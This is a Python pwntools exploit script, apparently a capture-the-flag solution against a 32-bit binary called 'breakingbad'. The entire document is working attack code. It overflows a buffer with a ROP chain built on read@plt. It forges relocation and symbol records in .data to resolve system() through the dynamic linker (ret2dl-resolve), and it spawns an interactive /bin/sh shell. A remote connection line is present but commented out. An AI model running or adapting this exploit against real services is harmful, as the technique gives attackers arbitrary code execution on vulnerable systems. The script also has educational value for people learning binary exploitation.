#!/usr/bin/env python

from pwn import *


def show_addr(addr_msg,addr):
    log.success(addr_msg + ' => ' + hex(addr))

binary = ELF('./breakingbad')

dynsym_sec_addr = binary.get_section_by_name('.dynsym')['sh_addr']
dynstr_sec_addr = binary.get_section_by_name('.dynstr')['sh_addr']
gnu_ver_sec_addr = binary.get_section_by_name('.gnu.version')['sh_addr']
rel_plt_sec_addr = binary.get_section_by_name('.rel.plt')['sh_addr']
plt_sec_addr = binary.get_section_by_name('.plt')['sh_addr']
data_sec_addr = binary.get_section_by_name('.data')['sh_addr']     #0x440 enough to put your fake frame

show_addr('dynsym_sec_addr',dynsym_sec_addr)
show_addr('dynstr_sec_addr',dynstr_sec_addr)
show_addr('gnu_ver_sec_addr',gnu_ver_sec_addr)
show_addr('rel_plt_sec_addr',rel_plt_sec_addr)
show_addr('plt_sec_addr',plt_sec_addr)
show_addr('data_sec_addr',data_sec_addr)

reloc_offset = data_sec_addr - rel_plt_sec_addr + 8 # first 8 bytes offset were occupied by '/bin/sh\x00'
fake_dynsym_addr = data_sec_addr + 16 # the next 8 bytes was occupied by fake_reloc
align = 0x10 - ((fake_dynsym_addr - dynsym_sec_addr) & 0xf)   # ensure the distance between dynsym and fake_dynsyn is 16 bytes alignment
fake_dynsym_addr += align
index_dynsym = (fake_dynsym_addr - dynsym_sec_addr) / 0x10 #each record of the dynsym_sec was 16 bytes
version_addr = gnu_ver_sec_addr + index_dynsym * 2  # get the version addr, each record of this section was 2 bytes

show_addr('reloc_offset',reloc_offset)

ndx = binary.read(version_addr,2)
while ndx != '\x00\x00':                  #loop until ndx = VERSYM[ELF32_R_SYM(reloc->r_info)] = 0 ,"local symbol"
    index_dynsym += 1 #increase the index
    version_addr = gnu_ver_sec_addr + index_dynsym * 2
    ndx = binary.read(version_addr,2)

align += index_dynsym * 0x10 - (fake_dynsym_addr - dynsym_sec_addr) #update the align 
fake_dynsym_addr = index_dynsym * 0x10 + dynsym_sec_addr

show_addr('index_dynsym',index_dynsym)
show_addr('fake_dynsym_addr',fake_dynsym_addr)
r_info = (index_dynsym << 8) | 0x7 # ensure ELF32_R_TYPE(reloc->r_info) = 7

print hex(align)
r_offset = data_sec_addr + 0x50
fake_reloc = p32(r_offset) + p32(r_info)
st_name = fake_dynsym_addr - dynstr_sec_addr + 16 # why add 16? because fake_dynsym is 16 bytes, st_name is next to fake_dynsym
fake_dynsym = p32(st_name) + p32(0x00) + p32(0x00) + p32(0x12) # create a record the same as the regular record in .dynsym

show_addr('r_info',r_info)
show_addr('r_offset',r_offset)
show_addr('st_name',st_name)


read_plt_addr = binary.plt['read']
pop_pop_pop_ret_addr = 0x0804880d
bss_addr = 0x0804a480
puts_plt_addr = binary.plt['puts']
pop_ret_addr = 0x080483b5

show_addr('puts_plt_addr',puts_plt_addr)
show_addr('read_plt_addr',read_plt_addr)

p = process('./breakingbad')
#p = remote('127.0.0.1',3333)
#read(0,addr,length)
payload1 = (
    'A'*12,#60 bytes
    p32(read_plt_addr),
    p32(pop_pop_pop_ret_addr),
    p32(0),
    p32(data_sec_addr),
    p32(0x600),
    p32(plt_sec_addr),
    p32(reloc_offset),
    p32(0xdeadbeef),
	p32(data_sec_addr),
)

payload1 = ''.join(payload1)

print p.recv()
p.send(payload1)
print p.recv()

payload2 = (
    'Methamphetamine',
    p32(0xffff),
    'A'*179,
    'B'*4
)

#gdb.attach(p,execute="bre *0x804863a") #break on main func return
payload2 = ''.join(payload2)
raw_input('#'*35 + 'sending payload1' + '#'*35)

p.send(payload2)
print p.recv()

payload3 = (
    '/bin/sh\x00',
    fake_reloc,
    "C" * align,
    fake_dynsym,
    'system\x00',
)
print 'fake_reloc => ' + fake_reloc.encode('hex')
print 'align => ' + str(align)
print 'fake_dynsym => ' + fake_dynsym.encode('hex') 
payload3 = ''.join(payload3)
raw_input('#'*35+'sending payload3'+'#'*35)
p.send(payload3)
p.interactive()

